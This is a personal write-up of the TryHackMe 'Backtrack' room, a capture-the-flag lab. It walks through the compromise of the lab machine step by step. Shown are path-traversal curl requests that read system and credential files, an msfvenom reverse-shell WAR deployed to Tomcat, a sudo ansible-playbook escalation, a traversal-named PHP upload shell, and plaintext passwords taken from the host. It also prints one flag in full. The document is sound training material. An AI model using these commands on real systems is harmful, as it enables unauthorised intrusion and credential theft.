<h1 align="center">Backtrack</h1>
<p align="center"><img width="80px" src=""https://github.com/user-attachments/assets/f16e3c98-b80c-43c9-87a8-eef325cab742"><br>
2025, September 11<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>493</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Daring to set foot where no one has</em>.<br>
Access it <a href="https://tryhackme.com/room/backtrack"</a>here.<br>
<img width="1200px" src=""></p>


<h2>Task 1 . Deploy the machine and Get the Flags!</h2>
<p>Compromise the machine and get the flags.<br>

Note: Please allow at least 5 minutes for the machine to boot and configure.</p>

<p><em>Answer the questions below</em></p>

<p>1.2. What is the content of flag2.txt<br>
<code></code></p>

<p>1.3. What is the content of flag3.txt<br>
<code></code></p>


<h2>nmap</h2>

<p>


- 
</p>

```bash
:~/Backtrack# nmap -sT -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE
22/tcp   open  ssh
6800/tcp open  unknown
8080/tcp open  http-proxy
8888/tcp open  sun-answerbook
```

<p>

- 8888 : Aria2 WebUI 1.1</p>

```bash
:~/Backtrack# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6800/tcp open  http            aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.93
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Thu, 11 Sep 2025 xx:xx:xx GMT
|     Connection: close
|     <!doctype html>
|     <html>
|     <!-- {{{ head -->
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta name="theme-color" content="#0A8476">
|     <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
|     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
|     <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
|     <!-- }}} -->
|     <body ng-controller="MainCtrl" ng-cloak>
|     <!-- {{{ Icons -->
|_    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
```

<h2>nikto</h2>

```bash
~/Backtrack# nikto -h xx.xxx.xx.xxx:6800
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        6800
+ Start Time:         2025-09-11 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 6544 items checked: 13 error(s) and 1 item(s) reported on remote host
+ End Time:           2025-09-11 xx:xx:xx (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Backtrack# nikto -h xx.xxx.xx.xxx:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        8080
+ Start Time:         2025-09-11 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1692830594000 
+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3931: /myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-4598: /members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ OSVDB-2946: /forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ /manager/html: Default Tomcat Manager interface found
+ 6544 items checked: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-09-11 xx:xx:xx (GMT1) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<p>

-  /../../../../../../../../../../etc/passwd<br>
- /../../../../../../../../../../etc/passwd<br>
- /ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd<br>
- ////////../../../../../../etc/passwd<br>
- /htdocs/../../../../../../../../../../../etc/passwd</p>

```bash
:~/Backtrack# nikto -h xx.xxx.xx.xxx:8888
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    xx.xxx.xx.xxx
+ Target Port:        8888
+ Start Time:         2025-09-11 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /DomainFiles/*//../../../../../../../../../../etc/passwd: Communigate Pro 4.0b to 4.0.2 allow any file to be retrieved from the remote system.
+ /../../../../../../../../../../etc/passwd: It is possible to read files on the server by adding ../ in front of file name.
+ /ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd: It is possible to read files on the server by adding through directory traversal by adding multiple /\\.. in front of file name.
+ OSVDB-3133: ////////../../../../../../etc/passwd: Xerox WorkCentre allows any file to be retrieved remotely.
+ OSVDB-18255: /htdocs/../../../../../../../../../../../etc/passwd: SAP Internet Graphics Server (IGS) directory traversal
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-09-11 xx:xx:xx (GMT1) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>gobuster</h2>

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:6800/ -w /usr/share/dirb/wordlists/common.txt
...
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8080/ -w /usr/share/dirb/wordlists/common.txt
...
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 4614 / 4615 (99.98%)
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8080/manager/ -w /usr/share/dirb/wordlists/common.txt
...
/css                  (Status: 302) [Size: 0] [--> /manager/css/]
/html                 (Status: 401) [Size: 2499]
/images               (Status: 302) [Size: 0] [--> /manager/images/]
/status               (Status: 401) [Size: 2499]
/text                 (Status: 401) [Size: 2499]
Progress: 46
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8888/ -w /usr/share/dirb/wordlists/common.txt
...
/flags                (Status: 500) [Size: 82]
/index.html           (Status: 200) [Size: 80665]
Progress: 4614 / 4615 (99.98%)
```

```bash
:~/Backtrack# gobuster dir -u http://xx.xxx.xx.xxx:8888/flags/ -w /usr/share/dirb/wordlists/common.txt
...
/flags                (Status: 500) [Size: 82]
/index.html           (Status: 200) [Size: 80665]
Progress: 4614 / 4615 (99.98%)
```

<h2>port 6800</h2>

<img width="1374" height="268" alt="image" src="https://github.com/user-attachments/assets/5b4c28dd-3908-4128-82b7-0a5b257e351c" />

<br>
<br>
<h2>Web port 8080, Apache Tomcat 8.5.93</h2>

<img width="857" height="785" alt="image" src="https://github.com/user-attachments/assets/58ae71b9-9ac6-40d4-988c-277fd00078ac" />

<br>
<br>

<img width="1167" height="256" alt="image" src="https://github.com/user-attachments/assets/efd3eb21-3ee6-42ec-a60e-69f7100a0423" />

<br>
<br>
<h2>Web port 8888</h2>

<img width="1363" height="646" alt="image" src="https://github.com/user-attachments/assets/84d936dd-bf53-4ebe-a752-89e8dcf9e360" />


<br>
<br>
<p>

- version 1.35.0</p>

<img width="1363" height="645" alt="image" src="https://github.com/user-attachments/assets/261f49f6-d121-43df-acaf-c64b89642aa8" />



<br>
<br>
<h2>Web port 8888  .  /etc/passwd</h2>

```bash
curl --path-as-is http://10.201.93.190:8888/../../../../../../../../../../etc/passwd
```

<img width="1237" height="658" alt="image" src="https://github.com/user-attachments/assets/a964d269-50d4-4cf8-b5c2-ecba4d3b9f16" />


<br>
<br>
<h2>:8888/flags</h2>
<p>

- Error: ENOENT: no such file or directory, open '/opt/aria2/docs/flags//index.html'</p>


<h2>Web port 8888  .  /opt/tomcat/conf/tomcat-users.xml</h2>

```bash
~/Backtrack# curl --path-as-is http://10.201.93.190:8888/../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>

</tomcat-users>
```

<h2>:8080/manager</h2>

<img width="1211" height="246" alt="image" src="https://github.com/user-attachments/assets/e97ae242-8c1b-4bdb-8d9c-f098f675fc58" />

<br>
<br>
<h2>:8080/manager/html</h2>

<img width="1173" height="481" alt="image" src="https://github.com/user-attachments/assets/7c35b1b8-fe35-4bf1-bc05-ab427402da6b" />

<br>
<br>
<h2>:8080/manager/status</h2>

<img width="1162" height="306" alt="image" src="https://github.com/user-attachments/assets/14074aa7-24f1-4717-9703-c94c87cc88cc" />

<br>
<br>

<img width="1256" height="595" alt="image" src="https://github.com/user-attachments/assets/e7a5e415-340f-48cd-b1ca-5dda8ee630f7" />

Server Information: IP Address: 127.0.0.1
Client (Forwarded): 10.201.18.53
Client (Actual): 10.201.18.53
VHost: 10.201.20.109
Request: GET /manager/status HTTP/1.1

<p>
  
- clicked Complete Server Status</p>

<img width="1257" height="675" alt="image" src="https://github.com/user-attachments/assets/3d8ac05c-e66b-4124-b45d-3f3ed9b50106" />

<br>
<br>

<h2>:8080/manager/status/all</h2>

<img width="1260" height="324" alt="image" src="https://github.com/user-attachments/assets/2f928c93-c346-4c47-9c40-c86f5b6bc409" />

<br>
<br>

```bash
:~/Backtrack# msfvenom -p java/shell_reverse_tcp lhost=10.201.18.53 lport=1234 -f war > shell.war
Payload size: 13030 bytes
Final size of war file: 13030 bytes
```

```bash
:~/Backtrack# curl --upload-file shell.war -u 'tomcat:OPx52k53D8OkTZpx4fr' 'http://10.201.20.109:8080/manager/text/deploy?path=/rosana'
OK - Deployed application at context path [/rosana]
```

```bash
:~/Backtrack# curl http://10.201.20.109:8080/rosana
```

```bash
:~/Backtrack# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.20.109 46024
id
uid=1002(tomcat) gid=1002(tomcat) groups=1002(tomcat)
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@Backtrack:/$ ^Z
[1]+  Stopped                 nc -nlvp 1234
:~/Backtrack# stty raw -echo; fg
nc -nlvp 1234

tomcat@Backtrack:/$ export TERM=xterm
tomcat@Backtrack:/$
```


```bash
tomcat@Backtrack:/$ find / type -name flag1.txt 2>/dev/null
/opt/tomcat/flag1.txt
```

```bash
tomcat@Backtrack:/$ cat /opt/tomcat/flag1.txt
THM{823e4e40ead9683b06a8194eab01cee8}
```

```bash
tomcat@Backtrack:/$ ls -lah /opt/tomcat/
total 160K
drwxr-xr-x  9 tomcat tomcat 4.0K Mar  9  2024 .
drwxr-xr-x  5 root   root   4.0K Mar  9  2024 ..
-rw-r-----  1 tomcat tomcat  20K Aug 23  2023 BUILDING.txt
-rw-r-----  1 tomcat tomcat 6.1K Aug 23  2023 CONTRIBUTING.md
-rw-r-----  1 tomcat tomcat  56K Aug 23  2023 LICENSE
-rw-r-----  1 tomcat tomcat 1.7K Aug 23  2023 NOTICE
-rw-r-----  1 tomcat tomcat 3.4K Aug 23  2023 README.md
-rw-r-----  1 tomcat tomcat 7.0K Aug 23  2023 RELEASE-NOTES
-rw-r-----  1 tomcat tomcat  17K Aug 23  2023 RUNNING.txt
drwxr-x---  2 tomcat tomcat 4.0K Mar  9  2024 bin
drwxr-x---  3 tomcat tomcat 4.0K Mar  9  2024 conf
-rw-r--r--  1 tomcat tomcat   38 Mar  9  2024 flag1.txt
drwxr-x---  2 tomcat tomcat 4.0K Mar  9  2024 lib
drwxr-x---  2 tomcat tomcat 4.0K Sep 12 00:16 logs
drwxr-x---  2 tomcat tomcat 4.0K Sep 11 23:57 temp
drwxr-x--- 10 tomcat tomcat 4.0K Sep 12 00:18 webapps
drwxr-x---  3 tomcat tomcat 4.0K Mar  9  2024 work
```


```bash
tomcat@Backtrack:/$ sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
```

```bash
tomcat@Backtrack:/opt$ ls
aria2  test_playbooks  tomcat
```

```bash
tomcat@Backtrack:/opt/test_playbooks$ ls
failed_login.yml  suspicious_ports.yml
```

```bash
tomcat@Backtrack:/opt/test_playbooks$ cat failed_login.yml
---
- name: Check for Failed Login Attempts
  hosts: localhost

  tasks:
    - name: Search for failed login attempts
      command: grep "Failed password" /var/log/auth.log
      register: failed_login_attempts
      ignore_errors: yes

    - name: Report failed login attempts
      debug:
        var: failed_login_attempts.stdout_lines
```

<h3>failed_login.yml</h3>

```bash
tomcat@Backtrack:/opt/test_playbooks$ cat failed_login.yml
---
- name: Check for Failed Login Attempts
  hosts: localhost

  tasks:
    - name: Search for failed login attempts
      command: grep "Failed password" /var/log/auth.log
      register: failed_login_attempts
      ignore_errors: yes

    - name: Report failed login attempts
      debug:
        var: failed_login_attempts.stdout_lines
```

<h3>suspicious_ports.yml</h3>

```bash
tomcat@Backtrack:/opt/test_playbooks$ cat suspicious_ports.yml
---
- name: Check for Suspicious Open Ports on Localhost
  hosts: localhost
  gather_facts: no

  tasks:
    - name: List open ports
      command: "netstat -tuln"
      register: open_ports

    - name: Check and report suspicious open ports
      debug:
        msg: "Suspicious port open: {{ item }}"
      with_items:
        - '9001'
        - '1337'
        - '4444'
        - '6666'
        - '6969'
        - '5555'
        - '31337'
        - '4141'
        - '9000'
      when: "'0.0.0.0:{{ item }}' in open_ports.stdout"
```

```bash
tomcat@Backtrack:/tmp$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > shell.yml
```

```bash
tomcat@Backtrack:/tmp$ ls
...
shell.yml
...
```

```bash
tomcat@Backtrack:/tmp$ chmod 777 shell.yml
```

```bash
tomcat@Backtrack:/tmp$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../../../tmp/shell.yml
```

```bash
tomcat@Backtrack:/tmp$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../../../tmp/shell.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/connection/httpapi.py) as it seems to be invalid:
module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/connection/vmware_tools.py) as it seems to be invalid:
module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/connection/winrm.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/foreman.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/grafana_annotations.py) as it seems to be
invalid: module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/hipchat.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/nrdp.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/slack.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/splunk.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
[WARNING]: Skipping plugin (/usr/lib/python3/dist-
packages/ansible/plugins/callback/sumologic.py) as it seems to be invalid:
module 'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'

PLAY [localhost] ***************************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [shell] *******************************************************************
```

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
wilbur@Backtrack:/tmp$ export TERM=xterm
```

```bash
wilbur@Backtrack:~$ ls -lah
total 28K
drwxrwx--- 3 wilbur wilbur 4.0K Sep 12 00:37 .
drwxr-xr-x 4 root   root   4.0K Mar  9  2024 ..
drwxrwxr-x 3 wilbur wilbur 4.0K Sep 12 00:37 .ansible
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 3.7K Mar  9  2024 .bashrc
-rw------- 1 wilbur wilbur   48 Mar  9  2024 .just_in_case.txt
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 1010 Mar  9  2024 .profile
-rw------- 1 wilbur wilbur  461 Mar  9  2024 from_orville.txt
```

```bash
wilbur@Backtrack:~$ ls -lah
total 28K
drwxrwx--- 3 wilbur wilbur 4.0K Sep 12 00:37 .
drwxr-xr-x 4 root   root   4.0K Mar  9  2024 ..
drwxrwxr-x 3 wilbur wilbur 4.0K Sep 12 00:37 .ansible
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 3.7K Mar  9  2024 .bashrc
-rw------- 1 wilbur wilbur   48 Mar  9  2024 .just_in_case.txt
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 1010 Mar  9  2024 .profile
-rw------- 1 wilbur wilbur  461 Mar  9  2024 from_orville.txt
```

```bash
wilbur@Backtrack:~$ cat .just_in_case.txt
in case i forget :

wilbur:mYe317Tb9qTNrWFND7KF
```

```bash
wilbur@Backtrack:~$ cat from_orville.txt
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$
```

```bash
wilbur@Backtrack:~$ getent hosts
127.0.0.1       localhost
127.0.0.1       ip6-localhost ip6-loopback
127.0.1.1       ubuntu-focal ubuntu-focal
127.0.2.1       Backtrack Backtrack
```

```bash
wilbur@Backtrack:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6800            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::6800                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8888                 :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.201.20.109:68        0.0.0.0:*                           -                  
```

```bash
:~/Backtrack# ssh wilbur@backtrack -L 6969:127.0.0.1:80
The authenticity of host 'backtrack (10.201.20.109)' can't be established.
ECDSA key fingerprint is SHA256:+JTB+Hgw0CNKneGDp0fHaQB+RewZaOp94dMpORXS+Rk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'backtrack,10.201.20.109' (ECDSA) to the list of known hosts.
wilbur@backtrack's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-Xmx1024M: command not found
wilbur@Backtrack:~$ 
```


<h2>locahost:6969</h2>

<img width="1257" height="339" alt="image" src="https://github.com/user-attachments/assets/7ad39868-72cf-426b-b572-baa0b3c57566" />

<br>
<br>
<h3>Login</h3>

<img width="1258" height="576" alt="image" src="https://github.com/user-attachments/assets/cdd3c973-e7d4-4aa1-942b-73636ffbf03b" />

<br>
<br>

<img width="1257" height="502" alt="image" src="https://github.com/user-attachments/assets/644d0914-bb24-48dc-800f-243f7d20a513" />

<br>
<br>
<h2>locahost:6969/dashboard.php</h2>

<img width="1257" height="440" alt="image" src="https://github.com/user-attachments/assets/b09d4912-bcff-4e7e-9c99-75036f1cbbcc" />

<br>
<br>
<h2>locahost:6969/uploads/</h2>

<img width="1261" height="381" alt="image" src="https://github.com/user-attachments/assets/021f2425-d1c3-43f0-8c76-1cde7b66d212" />

<br>
<br>
<h2>Listener</h2>

```bash
:~/Backtrack# nc -nlvp 1337
Listening on 0.0.0.0 1337
```

<br>
<br>
<p>

<img width="1088" height="521" alt="image" src="https://github.com/user-attachments/assets/d656e94b-7df3-48ec-b720-d0f9bbc21690" />


```bash
POST /dashboard.php HTTP/1.1
Host: localhost:6969
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://localhost:6969/dashboard.php
Cookie: PHPSESSID=ofpuclnfivfsda0ejq8t9qkk93
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: multipart/form-data;
Content-Length: 5948

-----------------------------241139083326356678182431439073
Content-Disposition: form-data; name="image"; filename="%25%32%65%25%32%65%25%32%66rev.png.php"
Content-Type: application/x-php

<?php
...
```


<br>
<br>

%25%32%65%25%32%65%25%32%66

```bash
HTTP/1.1 200 OK
Date: Fri, 12 Sep 2025 01:31:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2298
Connection: close
Content-Type: text/html; charset=UTF-8



<!DOCTYPE html>
<html>
...

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
A                           <div class="col-lg-4 col-md-12 mb-4 mb-lg-0">
                    <img src="uploads/rev.png.php" class="w-100 shadow-1-strong rounded mb-4" />
```

```bash
:~/Backtrack# nc -nlvp 443
...
$ id
uid=1003(orville) gid=1003(orville) groups=1003(orville)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
orville@Backtrack:/var/www/html$ ^Z
[2]+  Stopped                 nc -nlvp 443
root@ip-10-201-18-53:~/Backtrack# stty raw -echo; fg
nc -nlvp 443

orville@Backtrack:/var/www/html$ export TERM=xterm
orville@Backtrack:/var/www/html$ ls
css            includes   login.php   navbar.php    rev.png.php   uploads
dashboard.php  index.php  logout.php  register.php  rose.png.php
```

```bash
orville@Backtrack:/home/orville$ ls -lah
total 60K
drwxrwx--- 2 orville orville 4.0K Sep 12 01:27 .
drwxr-xr-x 4 root    root    4.0K Mar  9  2024 ..
lrwxrwxrwx 1 root    root       9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 orville orville 3.7K Mar  9  2024 .bashrc
lrwxrwxrwx 1 root    root       9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 orville orville  807 Mar  9  2024 .profile
-rw------- 1 orville orville   38 Mar  9  2024 flag2.txt
-rwx------ 1 orville orville  37K Sep 12 01:27 web_snapshot.zip
```

<h2>flag2</h2>

```bash
orville@Backtrack:/home/orville$ cat flag2.txt
THM{********************************}
```

<br>
<p>1.2. What is the content of flag2.txt<br>
<code>THM{********************************}</code></p>
<br>
<br>
<h2>find / -perm -u=s -type f 2>/dev/null
</h2>

```bash
orville@Backtrack:/home/orville$ find / -perm -u=s -type f 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/at
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/su
```


```bash
orville@Backtrack:/tmp$ ps -eo pid,cmd
    PID CMD
      1 /sbin/init
      2 [kthreadd]
      3 [rcu_gp]
      4 [rcu_par_gp]
      6 [kworker/0:0H-kblockd]
      8 [mm_percpu_wq]
      9 [ksoftirqd/0]
     10 [rcu_sched]
     11 [migration/0]
     12 [idle_inject/0]
     14 [cpuhp/0]
     15 [kdevtmpfs]
     16 [netns]
     17 [rcu_tasks_kthre]
     18 [kauditd]
     19 [khungtaskd]
     20 [oom_reaper]
     21 [writeback]
     22 [kcompactd0]
     23 [ksmd]
     24 [khugepaged]
     70 [kintegrityd]
     71 [kblockd]
     72 [blkcg_punt_bio]
     73 [xen-balloon]
     74 [tpm_dev_wq]
     75 [ata_sff]
     76 [md]
     77 [edac-poller]
     78 [devfreq_wq]
     79 [watchdogd]
     82 [kswapd0]
     83 [ecryptfs-kthrea]
     85 [kthrotld]
     86 [acpi_thermal_pm]
     87 [xenbus]
     88 [xenwatch]
     89 [scsi_eh_0]
     90 [kworker/0:1H-kblockd]
     91 [scsi_tmf_0]
     92 [scsi_eh_1]
     93 [scsi_tmf_1]
     95 [vfio-irqfd-clea]
     96 [ipv6_addrconf]
    107 [kstrp]
    110 [kworker/u31:0]
    123 [charger_manager]
    157 [cryptd]
    217 [raid5wq]
    257 [jbd2/xvda1-8]
    258 [ext4-rsv-conver]
    326 /lib/systemd/systemd-journald
    363 /lib/systemd/systemd-udevd
    424 [kaluad]
    425 [kmpath_rdacd]
    426 [kmpathd]
    427 [kmpath_handlerd]
    428 /sbin/multipathd -d -s
    455 /lib/systemd/systemd-networkd
    457 /lib/systemd/systemd-resolved
    460 /usr/lib/accountsservice/accounts-daemon
    461 /usr/bin/amazon-ssm-agent
    462 /usr/bin/aria2c --enable-rpc --rpc-listen-all
    464 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --
    474 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
    475 /usr/bin/node /opt/aria2/node-server.js
    482 /usr/sbin/cron -f
    483 /usr/lib/policykit-1/polkitd --no-debug
    488 /usr/sbin/rsyslogd -n -iNONE
    493 /lib/systemd/systemd-logind
    501 /usr/lib/udisks2/udisksd
    510 /usr/sbin/atd -f
    529 /usr/sbin/ModemManager
    561 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
    563 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
    567 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutd
    569 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.conf
    571 /sbin/agetty -o -p -- \u --noclear tty1 linux
    631 /usr/sbin/apache2 -k start
    826 /usr/sbin/mysqld
   1260 /usr/sbin/apache2 -k start
   1261 /usr/sbin/apache2 -k start
